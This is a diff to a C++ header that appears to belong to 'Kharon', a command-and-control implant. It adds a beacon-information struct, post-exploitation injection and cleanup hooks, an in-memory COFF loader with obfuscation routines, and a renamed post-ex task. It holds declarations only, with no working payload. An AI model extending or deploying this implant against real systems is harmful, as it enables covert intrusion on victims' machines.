@@ -148,6 +148,27 @@ typedef struct {
 
 auto DECLFN GetConfig( _Out_ KHARON_CONFIG* Cfg ) -> VOID;
 
+struct _BEACON_INFO {
+    PBYTE BeaconPtr;
+    ULONG BeaconLength;
+
+    struct {
+        CHAR*  AgentId;
+        WCHAR* CommandLine;
+        WCHAR* ImagePath;
+        ULONG  ProcessId;
+        BOOL   Elevated;
+    } Session;
+
+    struct {
+        PVOID NodeHead;
+        ULONG EntryCount;
+    } HeapRecords;
+
+    KHARON_CONFIG* Config;
+};
+typedef _BEACON_INFO BEACON_INFO;
+
 struct _JOBS {
     struct _JOBS* Next;
 
@@ -191,6 +212,17 @@ namespace Root {
         UINT64 MagicValue = KHARON_HEAP_MAGIC;
 
         KHARON_CONFIG Config;
+
+        struct {
+            COFF_MAPPED* Mapped;
+            BOOL         IsLoaded;
+            
+            PVOID fn_inject;
+            PVOID fn_poll;
+            PVOID fn_kill;
+            PVOID fn_list;
+            PVOID fn_cleanup;
+        } Postex;
 
         struct {
             ULONG AllocGran;
@@ -1015,7 +1047,7 @@ public:
     struct {
         UPTR  Hash;
         PVOID Ptr;
-    } ApiTable[35] = {
+    } ApiTable[36] = {
         ApiTable[0]  = { Hsh::Str("BeaconDataParse"),   reinterpret_cast<PVOID>(&Coff::DataParse) },
         ApiTable[1]  = { Hsh::Str("BeaconDataInt"),     reinterpret_cast<PVOID>(&Coff::DataInt) },
         ApiTable[2]  = { Hsh::Str("BeaconDataExtract"), reinterpret_cast<PVOID>(&Coff::DataExtract) },
@@ -1054,10 +1086,11 @@ public:
         ApiTable[32] = { Hsh::Str("BeaconPkgInt32"),   reinterpret_cast<PVOID>(&Coff::PkgInt32) },
         ApiTable[33] = { Hsh::Str("BeaconPkgInt64"),   reinterpret_cast<PVOID>(&Coff::PkgInt64) },
 
-        ApiTable[34] = { Hsh::Str("BeaconGetSpawnTo"), reinterpret_cast<PVOID>(&Coff::GetSpawn) },
+        ApiTable[34] = { Hsh::Str("BeaconGetSpawnTo"),  reinterpret_cast<PVOID>(&Coff::GetSpawn) },
+        ApiTable[35] = { Hsh::Str("BeaconInformation"), reinterpret_cast<PVOID>(&Coff::Information) },
     };
 
-    auto Add( PVOID MmBegin, PVOID MmEnd, CHAR* UUID, ULONG CmdID ) -> BOF_OBJ*;
+    auto Add( PVOID MmBegin, PVOID MmEnd, CHAR* UUID, ULONG CmdID, PVOID Entry ) -> BOF_OBJ*;
     auto GetTask( PVOID Address ) -> CHAR*;
     auto GetCmdID( PVOID Address ) -> ULONG;
     auto Rm( BOF_OBJ* Obj ) -> BOOL;
@@ -1069,6 +1102,17 @@ public:
         _In_ BYTE* Buffer, _In_ ULONG Size, _In_ BYTE* Args, 
         _In_ ULONG Argc, _In_ CHAR* UUID, _In_ ULONG CmdID
     ) -> BOOL;
+
+    auto Execute(
+        _In_ COFF_MAPPED* Mapped, _In_ BYTE* Args, 
+        _In_ ULONG Argc, _In_ CHAR* UUID, _In_ ULONG CmdID 
+    ) -> BOOL;
+
+    auto FindSymbol( _In_ COFF_MAPPED* Mapped, _In_ PCHAR SymName ) -> PVOID;
+    auto Map( _In_  BYTE* Buffer, _In_ ULONG Size, _Out_ COFF_MAPPED* Mapped ) -> BOOL;
+    auto Unmap( _In_ COFF_MAPPED* Mapped ) -> BOOL;
+    auto Obfuscate( _In_ COFF_MAPPED* Mapped ) -> BOOL;
+    auto Deobfuscate( _In_ COFF_MAPPED* Mapped ) -> BOOL;
 
     static auto DataExtract( DATAP* parser, PINT size ) -> PCHAR;
     static auto DataInt( DATAP* parser ) -> INT;
@@ -1123,6 +1167,8 @@ public:
     static auto AddValue( _In_ PCCH key, _In_ PVOID ptr ) -> BOOL;
     static auto GetValue( _In_ PCCH key ) -> PVOID;
     static auto RmValue( _In_ PCCH key ) -> BOOL;
+
+    static auto Information( _Out_ BEACON_INFO* info ) -> BOOL;
 
     static auto PrintfW( _In_ INT32 type, PWCH fmt, ... ) -> VOID;
     static auto Printf( _In_ INT32 type, _In_ PCCH Fmt, ... ) -> VOID;
@@ -1183,6 +1229,7 @@ public:
 
     CHAR TunnelUUID[37]   = "00000000-0000-0000-0000-000000000001"; 
     CHAR DownloadUUID[37] = "00000000-0000-0000-0000-000000000002";
+    CHAR PostexUUID[37]   = "00000000-0000-0000-0000-000000000003"; 
 
     CHAR* CurrentUUID  = nullptr;
     ULONG CurrentCmdId = 0;
@@ -1439,8 +1486,6 @@ private:
 public:
     Task( Root::Kharon* KharonRf ) : Self( KharonRf ) {};
 
-    BOOL HasTask;
-
     auto Dispatcher( VOID  ) -> VOID;
 
     auto Token( _In_ JOBS* Job ) -> ERROR_CODE;
@@ -1450,7 +1495,7 @@ public:
 
     auto Pivot( _In_ JOBS* Job ) -> ERROR_CODE;
 
-    auto Config( _In_ JOBS* Job ) -> ERROR_CODE;
+    auto Postex( _In_ JOBS* Job ) -> ERROR_CODE;
     auto ExecBof( _In_ JOBS* Job ) -> ERROR_CODE;
     auto Exit( _In_ JOBS* Job ) -> ERROR_CODE;
     auto Jobs( _In_ JOBS* Job ) -> ERROR_CODE;
@@ -1468,7 +1513,7 @@ public:
     } Mgmt[TSK_LENGTH] = {
         Mgmt[0].ID  = Action::Task::Exit,              Mgmt[0].Run  = &Task::Exit,
         Mgmt[1].ID  = Action::Task::ExecBof,           Mgmt[3].Run  = &Task::ExecBof,
-        Mgmt[2].ID  = Action::Task::Config,            Mgmt[4].Run  = &Task::Config,
+        Mgmt[2].ID  = Action::Task::PostEx,            Mgmt[4].Run  = &Task::Postex,
         Mgmt[3].ID  = Action::Task::Download,          Mgmt[5].Run  = &Task::Download,
         Mgmt[4].ID  = Action::Task::Upload,            Mgmt[6].Run  = &Task::Upload,
         Mgmt[5].ID  = Action::Task::Socks,             Mgmt[7].Run  = &Task::Socks,
